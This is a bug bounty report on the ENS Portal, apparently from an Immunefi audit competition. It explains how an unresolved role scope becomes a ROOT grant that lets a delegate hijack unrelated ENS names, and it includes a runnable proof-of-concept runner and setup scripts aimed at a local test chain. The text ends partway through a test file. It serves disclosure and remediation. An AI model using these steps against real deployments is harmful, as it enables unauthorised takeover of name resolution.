# 91855 w a critical portal treats an unresolved resolver role scope as root enabling cross name resolution hijacking

## #91855 \[W\&A-Critical] Portal treats an unresolved resolver-role scope as ROOT, enabling cross-name resolution hijacking

**Submitted on Sep 4th 2026 at 21:15:31 UTC by @coinsspor for** [**Audit Competition | ENS**](https://immunefi.com/audit-competition/audit-competition-ens)

* **Report ID:** #91855
* **Report Type:** Websites & Apps
* **Report severity:** Critical
* **Target:** <https://github.com/immunefi-team/audit-comp-ens/tree/audit-comp-ready/apps/portal>
* **Impacts:**
  * Malicious interactions with an already-connected wallet, such as: Modifying transaction arguments or parameters Substituting contract addresses Submitting malicious transactions Signing or submitting a transaction against the wrong chain (for example when the request's target chain is not validated) Inducing a blanket token approval (for example setApprovalForAll on the registry or NameWrapper) to an attacker-controlled address

### Description

### Brief/Intro

ENS Portal leaves a PermissionedResolver authorization row editable when it cannot bind that row's resource to an ENS name. The sidebar converts this unknown scope to `name = ''`, which the transaction builder explicitly interprets as ROOT. A normal resolver change creates this state without any incorrect indexer response: the moved name disappears from the old resolver's current `nodes`, while its on-chain name-scoped role assignment remains on that resolver. When the victim later edits this stale role through the normal Portal workflow, Portal asks the connected wallet to approve `grantRootRoles(...)` instead of a name-scoped grant. The delegate gains new authority over unrelated names on the shared resolver and can redirect their ENS resolution to an attacker-controlled address.

### Vulnerability Details

#### Affected asset and revision

* Asset: `apps/portal`
* Audited upstream revision: `63772fd872af472ced58b009499355f3430c2a86`
* Public competition import tested: `cda79acaad59711b943fc68207ebb3f1d0ff8596`

The PoC verifies the exact import commit before execution and runs the production Portal build against the official isolated ENS environment.

#### Root cause

Portal constructs the authorization resource-to-name map only from the resolver's current `nodes`:

```ts
// apps/portal/src/lib/roles/resolverRoles.ts:138-159
export const computeNameResource = (name: string): string =>
  keccak256(
    encodePacked(['bytes32', 'bytes32'], [namehash(name), ZERO_BYTES32]),
  )

for (const node of nodes) {
  if (node.name) {
    map.set(computeNameResource(node.name).toLowerCase(), node.name)
  }
}
```

This is insufficient for authorizing role mutations. If a name is moved from Resolver A to Resolver B, a correct indexer removes the name from Resolver A's current `nodes`. The pre-existing role assignment can remain on Resolver A, however, and still appears in Resolver A's `roles`. Portal has no current node from which to reconstruct that role's name.

`groupRolesByAccount()` retains the role but records no resolved name:

```ts
// apps/portal/src/lib/roles/resolverRoles.ts:193-219
const resolvedName = resourceToName?.get(resource) ?? null

if (resolvedName) names.add(resolvedName)

resolvedNames: Array.from(g.resolvedNames)
```

The sidebar then converts the missing scope into the same empty-string value used for ROOT:

```ts
// apps/portal/src/features/resolver/components/ResolverRolesSidebar.tsx:165-169
const resolvedNames = row?.original.resolvedNames ?? []
const roleName = resolvedNames.find((n) => n !== '(root)') ?? ''
```

The normal Edit/Save flow carries that value into the mutation:

```ts
// ResolverRolesSidebar.tsx:195-237 and 295-303
await grantResolverRoles({ name, account, roles: rolesToGrant, ... })

setPendingAction({
  type: 'save',
  name: roleName,
  account: selectedAccount,
  rolesToGrant,
  rolesToRevoke,
})
```

Finally, the helper deliberately interprets `name === ''` as resolver ROOT:

```ts
// apps/portal/src/features/resolver/helpers/grantResolverRoles.ts:45-60
name === ''
  ? { resolverAddress, targetAccount: account, scope: 'root', roles }
  : { resolverAddress, targetAccount: account, scope: 'name', name, roles }
```

This is not an unavoidable empty-name convention. Portal already models a verified root assignment explicitly as `resolvedNames = ['(root)']`, because `buildResourceToNameMap()` maps `ROOT_RESOURCE` to `'(root)'`. An unresolved assignment is separately represented as `resolvedNames = []`. The defect is collapsing these distinguishable states into the same ROOT mutation sentinel.

The contract also publishes the resource/name relationship in its `NamedResource` event. Portal nevertheless authorizes later mutations using a scope reconstructed solely from the resolver's current-node projection instead of preserving or verifying the original authorization identity.

#### Normal production lifecycle

1. The victim owns `alpha.eth` and `beta.eth`; both initially use Resolver A.
2. The victim gives the attacker only name-scoped `ROLE_SET_TEXT` on alpha.
3. The attacker has no ROOT `ROLE_SET_ADDR`, no beta `ROLE_SET_ADDR`, cannot change beta and cannot grant itself ROOT authority. Both exact calls revert.
4. Using Portal's normal Change resolver workflow, the victim deploys Resolver B and moves alpha from Resolver A to Resolver B.
5. Real Panoptes correctly reports beta—but no alpha—in Resolver A's current `nodes`; the on-chain alpha-scoped role assignment remains in Resolver A's `roles`.
6. Portal presents that unresolved authorization row with an ordinary Edit action. The victim enables Address Manager and clicks Save.
7. Portal submits `grantRootRoles(1, attacker)` to the connected wallet rather than a name-scoped grant.
8. The successful transaction gives the attacker ROOT SET\_ADDR authority over Resolver A, including unrelated beta.
9. The attacker independently executes the exact beta `setAddr` call that reverted before the Portal transaction.
10. The official Universal Resolver changes beta from the victim address to the attacker address.

There is no race, narrow timing window, fabricated role row, stale or incorrect indexer response, mocked security state, DevTools modification, local-storage edit, or independent payer.

#### Indexer-scope independence

The frozen build also exposes a secondary Panoptes resource-representation difference. To ensure this report does not depend on treating that out-of-scope component as vulnerable, I applied a compatibility-only control that changes only Portal's node-map key to the representation returned by Panoptes. It does not add the candidate-specific fail-closed fix or modify either transaction builder.

With that compatibility control:

```
before resolver change:
  initialAlphaPresent = true
  initialRolePresent = true
  initialPortalMappedName = alpha.eth

after the normal resolver change:
  alphaPresentAfterResolverChange = false
  betaPresentAfterResolverChange = true
  rolePresentAfterResolverChange = true
  Resolver A nodeCount = 1
```

Portal then reproduced the same unresolved row, mined `grantRootRoles(1, attacker)`, and allowed the same beta hijack. Therefore a minimal correction of the Panoptes representation difference does not repair the finding. The independent in-scope defect is Portal's fail-open conversion of any unresolved authorization scope into explicit ROOT.

#### Unique security delta and controls

Before the Portal bug:

```
attacker alpha ROLE_SET_TEXT = true
attacker ROOT ROLE_SET_ADDR  = false
attacker beta ROLE_SET_ADDR  = false
attacker setAddr(beta)       = REVERT
attacker grantRootRoles      = REVERT
unrelated control setAddr    = REVERT
beta Universal Resolver      = victim
```

After the Portal transaction:

```
decoded transaction          = grantRootRoles(1, attacker)
transaction status           = success
attacker ROOT ROLE_SET_ADDR  = true
effective beta SET_ADDR      = true
attacker setAddr(beta)       = success
beta Universal Resolver      = attacker
```

This is not persistence of authority the attacker previously possessed. The attacker could modify only alpha text data before the bug and could not produce the beta effect or self-create ROOT. The victim's wrong Portal transaction is necessary for the new cross-resource capability.

#### Independence from prior reports

Submission `#90459`, matched to `#89253`, concerns `groupRolesByAccount()` merging different resources for one account and a Remove-user action revoking only one represented resource. Its natural `(account, resource)` grouping fix was applied in isolation; this complete resolver-change P4 exploit still passed.

The cached V1-owner migration family matched to `#89249` concerns Manager restoring a stale V1 principal during migration. This report uses no migration, cached owner, or execution-time owner-rebind primitive.

The weaker unresolved-row Remove-user behavior and the Edit/Save over-grant share the same unresolved-resource to empty-string to ROOT-sentinel root cause. They are one finding. This report uses over-grant as the primary consequence because it proves a capability the attacker never possessed before.

#### Recommended remediation

Treat authorization scope as a tagged, verified value rather than overloading the empty string:

* preserve the original resource/name binding as first-class data;
* represent verified ROOT and unresolved scope as different states;
* disable grant/revoke mutations when the resource cannot be verified as a concrete name or explicit ROOT;
* never allow an unresolved resource to reach a root-role transaction builder.

The executed experimental fix makes unresolved rows read-only. After the same resolver-change lifecycle, Save and Remove are unavailable, ROOT and beta roles remain false, the attacker beta call still reverts, and the native resolver-role suite passes 16/16.

### Impact Details

The selected in-scope Critical impact is:

> Malicious interactions with an already-connected wallet, such as modifying transaction arguments or parameters or submitting malicious transactions.

The connected victim intends to edit a narrow delegate relationship. Portal instead constructs a maximally broader ROOT authorization transaction. The PoC captures the actual wallet request, decodes it as `grantRootRoles(1, attacker)`, mines it successfully, and proves that the newly created authority enables an unauthorized record change on unrelated beta.

The attacker-driven terminal effect occurs before recovery: beta's official Universal Resolver result changes from the victim address to the attacker address. The attacker cannot force when or whether the victim edits the role, but after approval there is no race or timeout; ROOT authority persists until the victim detects and explicitly revokes it.

Recovery is not automatic or immediate. After detection, the victim must send two on-chain transactions: revoke the erroneous ROOT role and restore beta's record. The PoC executes recovery only after the attacker has modified beta and attacker-controlled resolution has been observed. Recovery restores future state but cannot retroactively undo actions completed while the unauthorized ROOT role was active.

This report does not claim permanent takeover, irrecoverable state, direct fund theft, or a third-party payment.

### References

* Frozen role mapping: <https://github.com/immunefi-team/audit-comp-ens/blob/cda79acaad59711b943fc68207ebb3f1d0ff8596/apps/portal/src/lib/roles/resolverRoles.ts>
* Frozen sidebar mutation: <https://github.com/immunefi-team/audit-comp-ens/blob/cda79acaad59711b943fc68207ebb3f1d0ff8596/apps/portal/src/features/resolver/components/ResolverRolesSidebar.tsx>
* Frozen grant helper: <https://github.com/immunefi-team/audit-comp-ens/blob/cda79acaad59711b943fc68207ebb3f1d0ff8596/apps/portal/src/features/resolver/helpers/grantResolverRoles.ts>
* Frozen revoke helper: <https://github.com/immunefi-team/audit-comp-ens/blob/cda79acaad59711b943fc68207ebb3f1d0ff8596/apps/portal/src/features/resolver/helpers/revokeResolverRoles.ts>
* ENS Audit Competition scope: <https://immunefi.com/audit-competition/audit-competition-ens/scope/>

### Proof of Concept

## Proof of Concept

### What this PoC proves

This is a real production-build Portal, real Panoptes, real wallet-request and isolated local-chain reproduction against public competition import `cda79acaad59711b943fc68207ebb3f1d0ff8596` of audited revision `63772fd872af472ced58b009499355f3430c2a86`.

It proves the following causal sequence:

1. Alpha and beta initially use Resolver A.
2. The attacker receives only alpha-scoped `ROLE_SET_TEXT`.
3. Control A proves the attacker cannot modify beta.
4. Control B proves the attacker cannot grant itself ROOT.
5. The victim uses Portal's normal Change resolver workflow to move alpha to newly deployed Resolver B.
6. Real Panoptes correctly removes alpha from Resolver A's current `nodes`, keeps beta there, and keeps the on-chain alpha role assignment in Resolver A's `roles`.
7. Portal leaves the resulting unresolved role mutable.
8. The victim uses the normal Edit user roles flow and enables Address Manager.
9. The captured wallet request decodes to `grantRootRoles(1, attacker)`, and the transaction succeeds.
10. The attacker's exact beta `setAddr` call changes from revert to success.
11. The official Universal Resolver changes beta from victim to attacker.
12. Recovery happens afterward through two explicit victim transactions.

No GraphQL response, role row, wallet request, contract result, or resolver result is fabricated. There is no pagination, stale response, DevTools change, local-storage injection, public-network interaction, or third-party payment.

### Clean reproduction

Requirements: Linux/WSL, Node.js 22+, pnpm 10, Git, Docker with Compose, and enough disk space for the frozen monorepo and Playwright Chromium.

Create the exact file tree below, then run:

```bash
git clone https://github.com/immunefi-team/audit-comp-ens.git frozen-src
git -C frozen-src checkout cda79acaad59711b943fc68207ebb3f1d0ff8596

chmod +x run-poc.sh
ENS_SOURCE_ROOT="$PWD/frozen-src" ./run-poc.sh final
```

The runner hard-fails on the wrong commit, starts isolated Anvil and the official Panoptes services, builds Portal, installs Chromium if needed, creates the real lifecycle, drives Chromium, captures the wallet request, asserts authoritative state and tears down the runtime.

### Complete runnable files

#### `run-poc.sh`

```bash
#!/usr/bin/env bash
set -euo pipefail

package_root="$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)"
source_root="${ENS_SOURCE_ROOT:-$package_root/frozen-src}"
expected_sha="cda79acaad59711b943fc68207ebb3f1d0ff8596"
run_label="${1:-final}"
compose_project="enscand001v5${run_label//[^a-zA-Z0-9]/}"
base_compose="$source_root/e2e/infra/docker-compose.yml"
override_compose="$package_root/poc/docker-compose.override.yml"
runtime_evidence="$package_root/evidence/runtime-$run_label"
portal_port="${PORTAL_PORT:-3203}"
portal_url="http://127.0.0.1:$portal_port"

for command_name in git node pnpm docker curl; do
  command -v "$command_name" >/dev/null 2>&1 || {
    echo "Missing required command: $command_name" >&2
    exit 1
  }
done
docker compose version >/dev/null

if ! git -C "$source_root" rev-parse --git-dir >/dev/null 2>&1; then
  echo "Missing frozen checkout at $source_root" >&2
  echo "Clone the competition repository and checkout $expected_sha." >&2
  exit 1
fi
actual_sha="$(git -C "$source_root" rev-parse HEAD)"
[[ "$actual_sha" == "$expected_sha" ]] || {
  echo "Wrong source revision: expected $expected_sha, found $actual_sha" >&2
  exit 1
}
[[ "$(node -p 'Number(process.versions.node.split(`.`)[0])')" -ge 22 ]] || {
  echo "Node 22 or newer is required." >&2
  exit 1
}

install -D "$package_root/poc/cand001-overgrant-setup.ts" \
  "$source_root/e2e/scripts/cand001-overgrant-setup.ts"
install -D "$package_root/poc/cand001-overgrant.spec.ts" \
  "$source_root/e2e/projects/portal/tests/cand001-overgrant.spec.ts"
install -D "$package_root/poc/cand001-empty-name.test.ts" \
  "$source_root/apps/portal/src/features/resolver/helpers/cand001-empty-name.test.ts"

if [[ ! -d "$source_root/node_modules" ]]; then
  pnpm --dir "$source_root" install --frozen-lockfile
fi
pnpm --dir "$source_root/e2e" exec playwright install chromium

mkdir -p "$runtime_evidence"
fixture="$runtime_evidence/fixture.json"
diff -u "$source_root/e2e/infra/panoptes/contracts.json" \
  "$package_root/poc/panoptes-contracts.cand001.json" \
  >"$runtime_evidence/panoptes-config.diff" || true
preview_pid=""
cleanup() {
  [[ -z "$preview_pid" ]] || kill "$preview_pid" 2>/dev/null || true
  PANOPTES_CONTRACTS_FILE="$package_root/poc/panoptes-contracts.cand001.json" \
    docker compose -p "$compose_project" -f "$base_compose" -f "$override_compose" \
    down -v --remove-orphans >/dev/null 2>&1 || true
}
trap cleanup EXIT

PANOPTES_CONTRACTS_FILE="$package_root/poc/panoptes-contracts.cand001.json" \
  docker compose -p "$compose_project" -f "$base_compose" -f "$override_compose" \
  down -v --remove-orphans >/dev/null 2>&1 || true
PANOPTES_CONTRACTS_FILE="$package_root/poc/panoptes-contracts.cand001.json" \
  docker compose -p "$compose_project" -f "$base_compose" -f "$override_compose" \
  up -d anvil panoptes-indexer panoptes-api

for _ in $(seq 1 180); do
  if curl -fsS -H 'content-type: application/json' \
    --data '{"jsonrpc":"2.0","id":1,"method":"eth_chainId","params":[]}' \
    http://127.0.0.1:8754 >/dev/null && \
    curl -fsS -H 'content-type: application/json' \
      --data '{"query":"query{__typename}"}' \
      http://127.0.0.1:5855/graphql >/dev/null; then break; fi
  sleep 1
done
curl -fsS -H 'content-type: application/json' \
  --data '{"query":"query{__typename}"}' \
  http://127.0.0.1:5855/graphql >/dev/null

ANVIL_RPC_URL=http://127.0.0.1:8754 \
INDEXER_GRAPHQL_URL=http://127.0.0.1:5855/graphql \
CAND001_FIXTURE_OUTPUT="$fixture" \
  pnpm --dir "$source_root/e2e" exec tsx scripts/cand001-overgrant-setup.ts \
  2>&1 | tee "$runtime_evidence/lifecycle.log"

VITE_SEPOLIA_RPC_URL=http://127.0.0.1:8754 \
VITE_INDEXER_GRAPHQL_URL=http://127.0.0.1:5855/graphql \
  pnpm --dir "$source_root" --filter portal exec vite build \
  >"$runtime_evidence/portal-build.log" 2>&1
(
  cd "$source_root/apps/portal"
  pnpm exec vite preview --host 127.0.0.1 --port "$portal_port"
) >"$runtime_evidence/portal-preview.log" 2>&1 &
preview_pid=$!
for _ in $(seq 1 120); do
  curl -fsS "$portal_url" >/dev/null && break
  sleep 1
done
curl -fsS "$portal_url" >/dev/null

pnpm --dir "$source_root" --filter portal exec vitest run \
  src/features/resolver/helpers/cand001-empty-name.test.ts \
  2>&1 | tee "$runtime_evidence/helper-test.log"

ANVIL_RPC_URL=http://127.0.0.1:8754 \
INDEXER_GRAPHQL_URL=http://127.0.0.1:5855/graphql \
PORTAL_APP_URL="$portal_url" \
CAND001_FIXTURE_PATH="$fixture" \
POC_EVIDENCE_DIR="$runtime_evidence" \
CAND001_EXPECT_INITIAL_RESOLVED="${CAND001_EXPECT_INITIAL_RESOLVED:-false}" \
  pnpm --dir "$source_root/e2e" exec playwright test \
  --config=projects/portal/playwright.config.ts \
  --trace=on \
  --output="$runtime_evidence/playwright-results" \
  projects/portal/tests/cand001-overgrant.spec.ts \
  2>&1 | tee "$runtime_evidence/poc-run.log"

echo "ENS-NEW-001-v5 RESOLVER-CHANGE P4 OVER-GRANT PoC PASS"
```

#### `poc/cand001-overgrant-setup.ts`

```ts
import { mkdir, writeFile } from 'node:fs/promises'
import { ensL1Contracts, supportedL1Chains } from '@ensdomains/ensjs/chain'
import { permissionedResolverAuthorizeNameRolesSnippet } from '@ensdomains/ensjs-abi/v2/permissionedResolver'
import {
  type Address,
  encodeFunctionData,
  encodePacked,
  keccak256,
  maxUint256,
  namehash,
  parseAbi,
  parseAbiItem,
  parseEventLogs,
  toHex,
  zeroAddress,
  zeroHash,
} from 'viem'
import { mnemonicToAccount } from 'viem/accounts'
import { packetToBytes } from 'viem/ens'
import { createMakeV2Name } from '../fixtures/makeV2Name.js'
import { publicClient, testClient, walletClient } from '../helpers/anvil-client.js'

const DEFAULT_MNEMONIC =
  'test test test test test test test test test test test junk'
const owner = mnemonicToAccount(DEFAULT_MNEMONIC, { addressIndex: 0 })
const attacker = mnemonicToAccount(DEFAULT_MNEMONIC, { addressIndex: 2 })
const contracts = ensL1Contracts[supportedL1Chains.sepolia]
const registry = contracts.ensRegistry.address
const registrar = contracts.ensEthRegistrar.address
const paymentToken = contracts.usdc.address
const indexerUrl =
  process.env.INDEXER_GRAPHQL_URL ?? 'http://127.0.0.1:5855/graphql'
const outputPath = process.env.CAND001_FIXTURE_OUTPUT
if (!outputPath) throw new Error('CAND001_FIXTURE_OUTPUT is required')

const ROLE_SET_ADDR = 1n
const ROLE_SET_TEXT = 1n << 4n
const ZERO_BYTES32 = `0x${'0'.repeat(64)}` as const
const registryAbi = parseAbi([
  'function getResolver(string label) view returns (address)',
])
const registrarAbi = parseAbi([
  'function makeCommitment(string label, address owner, bytes32 secret, address subregistry, address resolver, uint64 duration, bytes32 referrer) pure returns (bytes32)',
  'function commit(bytes32 commitment)',
  'function register(string label, address owner, bytes32 secret, address subregistry, address resolver, uint64 duration, address paymentToken, bytes32 referrer) returns (uint256 tokenId)',
  'function MIN_COMMITMENT_AGE() view returns (uint64)',
])
const erc20Abi = parseAbi([
  'function mint(address to, uint256 amount)',
  'function approve(address spender, uint256 amount) returns (bool)',
])
const resolverAbi = parseAbi([
  'function hasRoles(uint256 resource, uint256 roleBitmap, address account) view returns (bool)',
  'function hasRootRoles(uint256 roleBitmap, address account) view returns (bool)',
])
const rolesChangedEvent = parseAbiItem(
  'event EACRolesChanged(uint256 indexed resource, address indexed account, uint256 oldRoleBitmap, uint256 newRoleBitmap)',
)
const namedResourceEvent = parseAbiItem(
  'event NamedResource(uint256 indexed resource, bytes name)',
)

type ResolverOverview = {
  nodeCount: number
  nodes: Array<{ name: string | null }>
  roles: Array<{
    account: string
    resource: string
    roleBitmap: string
    name: string | null
  }>
}

const resourceForName = (name: string) =>
  keccak256(
    encodePacked(['bytes32', 'bytes32'], [namehash(name), ZERO_BYTES32]),
  )

async function fetchOverview(resolverAddress: Address) {
  const response = await fetch(indexerUrl, {
    method: 'POST',
    headers: { 'content-type': 'application/json' },
    body: JSON.stringify({
      query:
        'query($id:String!){resolver(id:$id){nodeCount nodes{name} roles{account resource roleBitmap name}}}',
      variables: { id: resolverAddress.toLowerCase() },
    }),
  })
  const json = (await response.json()) as {
    data?: { resolver?: ResolverOverview | null }
    errors?: unknown
  }
  if (json.errors) throw new Error(JSON.stringify(json.errors))
  return json.data?.resolver ?? null
}

async function waitForOverview(
  resolverAddress: Address,
  predicate: (overview: ResolverOverview) => boolean,
  timeoutMs = 120_000,
) {
  const deadline = Date.now() + timeoutMs
  while (Date.now() < deadline) {
    const overview = await fetchOverview(resolverAddress).catch(() => null)
    if (overview && predicate(overview)) return overview
    await new Promise((resolve) => setTimeout(resolve, 500))
  }
  throw new Error('indexer did not expose the two-name over-grant lifecycle')
}

async function registerWithSharedResolver(
  label: string,
  resolverAddress: Address,
) {
  const duration = 365n * 24n * 60n * 60n
  const secret = keccak256(toHex(`cand001-overgrant:${label}`))
  const mintHash = await walletClient.sendTransaction({
    account: owner,
    to: paymentToken,
    data: encodeFunctionData({
      abi: erc20Abi,
      functionName: 'mint',
      args: [owner.address, 10n ** 28n],
    }),
  })
  await publicClient.waitForTransactionReceipt({ hash: mintHash })
  const approveHash = await walletClient.sendTransaction({
    account: owner,
    to: paymentToken,
    data: encodeFunctionData({
      abi: erc20Abi,
      functionName: 'approve',
      args: [registrar, maxUint256],
    }),
  })
  await publicClient.waitForTransactionReceipt({ hash: approveHash })
  const commitment = await publicClient.readContract({
    address: registrar,
    abi: registrarAbi,
    functionName: 'makeCommitment',
    args: [
      label,
      owner.address,
      secret,
      zeroAddress,
      resolverAddress,
      duration,
      zeroHash,
    ],
  })
  const commitHash = await walletClient.sendTransaction({
    account: owner,
    to: registrar,
    data: encodeFunctionData({
      abi: registrarAbi,
      functionName: 'commit',
      args: [commitment],
    }),
  })
  await publicClient.waitForTransactionReceipt({ hash: commitHash })
  const minAge = await publicClient.readContract({
    address: registrar,
    abi: registrarAbi,
    functionName: 'MIN_COMMITMENT_AGE',
  })
  await testClient.increaseTime({ seconds: Number(minAge) + 1 })
  await testClient.mine({ blocks: 1 })
  const registerHash = await walletClient.sendTransaction({
    account: owner,
    to: registrar,
    data: encodeFunctionData({
      abi: registrarAbi,
      functionName: 'register',
      args: [
        label,
        owner.address,
        secret,
        zeroAddress,
        resolverAddress,
        duration,
        paymentToken,
        zeroHash,
      ],
    }),
  })
  const receipt = await publicClient.waitForTransactionReceipt({
    hash: registerHash,
  })
  return { commitHash, registerHash, status: receipt.status }
}

async function main() {
  await Promise.all([
    testClient.setCode({ address: owner.address, bytecode: '0x' }),
    testClient.setCode({ address: attacker.address, bytecode: '0x' }),
  ])

  const makeV2Name = createMakeV2Name({ userAccount: owner })
  const alphaName = await makeV2Name({ label: 'cand001-alpha' })
  const alphaLabel = alphaName.slice(0, -4)
  const resolverAddress = await publicClient.readContract({
    address: registry,
    abi: registryAbi,
    functionName: 'getResolver',
    args: [alphaLabel],
  })

  const betaLabel = `cand001-beta-${Date.now()}`
  const betaName = `${betaLabel}.eth`
  const betaRegistration = await registerWithSharedResolver(
    betaLabel,
    resolverAddress,
  )
  const alphaResource = resourceForName(alphaName)
  const betaResource = resourceForName(betaName)
  const expectedPanoptesResource = BigInt(alphaResource) & ~0xffffffffn

  // The only initial delegation is SET_TEXT on alpha. The later Portal edit
  // will attempt to add SET_ADDR to this narrow relationship.
  const grantHash = await walletClient.sendTransaction({
    account: owner,
    to: resolverAddress,
    data: encodeFunctionData({
      abi: permissionedResolverAuthorizeNameRolesSnippet,
      functionName: 'authorizeNameRoles',
      args: [
        toHex(packetToBytes(alphaName)),
        ROLE_SET_TEXT,
        attacker.address,
        true,
      ],
    }),
  })
  const grantReceipt = await publicClient.waitForTransactionReceipt({
    hash: grantHash,
  })
  const alphaGrantEvents = parseEventLogs({
    abi: [rolesChangedEvent],
    logs: grantReceipt.logs,
    strict: true,
  })
  const alphaGrantEvent = alphaGrantEvents.find(
    (event) =>
      event.args.account.toLowerCase() === attacker.address.toLowerCase() &&
      (event.args.newRoleBitmap & ROLE_SET_TEXT) !== 0n,
  )
  if (!alphaGrantEvent) {
    throw new Error('alpha grant receipt did not emit EACRolesChanged')
  }
  if (alphaGrantEvent.args.resource !== BigInt(alphaResource)) {
    throw new Error(
      `contract event resource did not match Portal/contract raw resource: expected ${alphaResource}, emitted ${alphaGrantEvent.args.resource}`,
    )
  }
  const namedResourceEvents = parseEventLogs({
    abi: [namedResourceEvent],
    logs: grantReceipt.logs,
    strict: true,
  })
  const namedResourceLog = namedResourceEvents.find(
    (event) => event.args.resource === BigInt(alphaResource),
  )
  if (!namedResourceLog) {
    throw new Error('alpha grant receipt did not emit matching NamedResource')
  }
  const encodedAlphaName = toHex(packetToBytes(alphaName))
  if (namedResourceLog.args.name.toLowerCase() !== encodedAlphaName.toLowerCase()) {
    throw new Error('NamedResource did not bind the emitted raw resource to alpha')
  }

  const overview = await waitForOverview(
    resolverAddress,
    (value) => {
      const names = value.nodes.map((node) => node.name?.toLowerCase())
      return (
        names.includes(alphaName.toLowerCase()) &&
        names.includes(betaName.toLowerCase()) &&
        value.roles.some(
          (role) =>
            role.account.toLowerCase() === attacker.address.toLowerCase() &&
            (BigInt(role.roleBitmap) & ROLE_SET_TEXT) !== 0n,
        )
      )
    },
  )
  const indexedRole = overview.roles.find(
    (role) =>
      role.account.toLowerCase() === attacker.address.toLowerCase() &&
      (BigInt(role.roleBitmap) & ROLE_SET_TEXT) !== 0n,
  )
  if (!indexedRole) throw new Error('indexed alpha role disappeared')

  const portalMappedName = overview.nodes.find(
    (node) =>
      node.name &&
      resourceForName(node.name).toLowerCase() ===
        indexedRole.resource.toLowerCase(),
  )?.name
  if (BigInt(indexedRole.resource) !== expectedPanoptesResource) {
    throw new Error('indexed alpha resource did not match the observed Panoptes base identity')
  }
  if (BigInt(indexedRole.resource) === alphaGrantEvent.args.resource) {
    throw new Error(
      'expected Panoptes base resource to differ from the raw contract resource',
    )
  }
  if (overview.nodeCount !== 2 || overview.nodes.length !== 2) {
    throw new Error(
      `expected complete 2/2 projection, got ${overview.nodes.length}/${overview.nodeCount}`,
    )
  }
  if (portalMappedName) {
    throw new Error('Portal unexpectedly mapped the Panoptes-projected alpha resource')
  }

  const [alphaTextRole, betaAddrRole, rootAddrRole] = await Promise.all([
    publicClient.readContract({
      address: resolverAddress,
      abi: resolverAbi,
      functionName: 'hasRoles',
      args: [BigInt(alphaResource), ROLE_SET_TEXT, attacker.address],
    }),
    publicClient.readContract({
      address: resolverAddress,
      abi: resolverAbi,
      functionName: 'hasRoles',
      args: [BigInt(betaResource), ROLE_SET_ADDR, attacker.address],
    }),
    publicClient.readContract({
      address: resolverAddress,
      abi: resolverAbi,
      functionName: 'hasRootRoles',
      args: [ROLE_SET_ADDR, attacker.address],
    }),
  ])
  if (!alphaTextRole || betaAddrRole || rootAddrRole) {
    throw new Error(
      `unique-delta precondition failed: alphaText=${alphaTextRole} betaAddr=${betaAddrRole} rootAddr=${rootAddrRole}`,
    )
  }

  const result = {
    alphaName,
    betaName,
    resolverAddress,
    owner: owner.address,
    attacker: attacker.address,
    delegationGrantedBeforePortal: true,
    initialDelegatedRole: 'ROLE_SET_TEXT',
    requestedEditRole: 'ROLE_SET_ADDR',
    alphaResource,
    betaResource,
    expectedPanoptesAlphaResource: `0x${expectedPanoptesResource
      .toString(16)
      .padStart(64, '0')}`,
    onChainAlphaGrantEvent: {
      transactionHash: alphaGrantEvent.transactionHash,
      blockNumber: alphaGrantEvent.blockNumber.toString(),
      logIndex: alphaGrantEvent.logIndex,
      emitter: alphaGrantEvent.address,
      rawTopics: alphaGrantEvent.topics,
      rawData: alphaGrantEvent.data,
      decoded: {
        eventName: alphaGrantEvent.eventName,
        resource: `0x${alphaGrantEvent.args.resource
          .toString(16)
          .padStart(64, '0')}`,
        account: alphaGrantEvent.args.account,
        oldRoleBitmap: alphaGrantEvent.args.oldRoleBitmap.toString(),
        newRoleBitmap: alphaGrantEvent.args.newRoleBitmap.toString(),
      },
    },
    onChainNamedResourceEvent: {
      transactionHash: namedResourceLog.transactionHash,
      blockNumber: namedResourceLog.blockNumber.toString(),
      logIndex: namedResourceLog.logIndex,
      emitter: namedResourceLog.address,
      rawTopics: namedResourceLog.topics,
      rawData: namedResourceLog.data,
      decoded: {
        eventName: namedResourceLog.eventName,
        resource: `0x${namedResourceLog.args.resource
          .toString(16)
          .padStart(64, '0')}`,
        name: namedResourceLog.args.name,
      },
    },
    contractEventResourceEqualsPortalComputedResource: true,
    panoptesResourceEqualsEventWithLow32Cleared: true,
    portalComputedResourceDiffersFromPanoptesResource: true,
    indexedRole,
    portalMappedName: portalMappedName ?? null,
    unresolvedInFrozenPortal: true,
    unresolvedBecausePagination: false,
    nodeCount: overview.nodeCount,
    returnedNodeCount: overview.nodes.length,
    alphaWasReturned: true,
    betaWasReturned: true,
    alphaTextRoleBefore: alphaTextRole,
    betaAddrRoleBefore: betaAddrRole,
    rootAddrRoleBefore: rootAddrRole,
    alphaGrantTransactionHash: grantHash,
    alphaGrantTransactionStatus: grantReceipt.status,
    betaRegistration,
  }
  console.log(JSON.stringify(result, null, 2))
  const parent = outputPath.slice(0, outputPath.lastIndexOf('/'))
  if (parent) await mkdir(parent, { recursive: true })
  await writeFile(outputPath, `${JSON.stringify(result, null, 2)}\n`, 'utf8')
  if (parent) {
    await writeFile(
      `${parent}/alpha-resource-provenance.json`,
      `${JSON.stringify(
        {
          transactionHash: grantHash,
          portalComputedRawResource: alphaResource,
          contractEACRolesChanged: result.onChainAlphaGrantEvent,
          contractNamedResource: result.onChainNamedResourceEvent,
          panoptesProjectedResource: indexedRole.resource,
          transformation: 'panoptesProjectedResource = contractEventResource & ~0xffffffff',
          portalMappedName: null,
        },
        null,
        2,
      )}\n`,
      'utf8',
    )
  }
}

await main()
```

#### `poc/cand001-overgrant.spec.ts`

```ts
import { mkdir, readFile, writeFile } from 'node:fs/promises'
import {
  permissionedResolverGrantRootRolesSnippet,
  permissionedResolverHasRolesSnippet,
  permissionedResolverHasRootRolesSnippet,
  permissionedResolverRevokeRootRolesSnippet,
} from '@ensdomains/ensjs-abi/v2/permissionedResolver'
import { Web3RequestKind } from '@ensdomains/headless-web3-provider'
import { ensL1Contracts, supportedL1Chains } from '@ensdomains/ensjs/chain'
import {
  type Address,
  bytesToHex,
  decodeFunctionData,
  decodeFunctionResult,
  encodeFunctionData,
  namehash,
  parseAbi,
  parseAbiItem,
} from 'viem'
import { packetToBytes } from 'viem/ens'
import {
  connectWithHeadlessWallet,
  expect,
  test,
} from '../../../fixtures/playwright.portal.fixture.js'
import { publicClient, walletClient } from '../../../helpers/anvil-client.js'

const PORTAL_APP_URL = process.env.PORTAL_APP_URL ?? 'http://127.0.0.1:3201'
const FIXTURE_PATH = process.env.CAND001_FIXTURE_PATH
if (!FIXTURE_PATH) throw new Error('CAND001_FIXTURE_PATH is required')
const UNIVERSAL_RESOLVER =
